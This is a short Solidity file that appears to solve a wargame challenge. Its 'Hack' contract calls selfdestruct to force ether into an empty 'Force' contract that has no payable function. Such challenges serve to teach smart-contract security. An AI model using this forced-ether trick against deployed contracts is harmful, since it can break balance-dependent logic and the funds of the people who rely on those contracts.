// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract Hack {
    Force force;

    constructor(address payable _force) {
        force = Force(_force);
    }

    function sendEther() public payable {
        selfdestruct(payable(address(force)));
    }

    receive() external payable {}
}
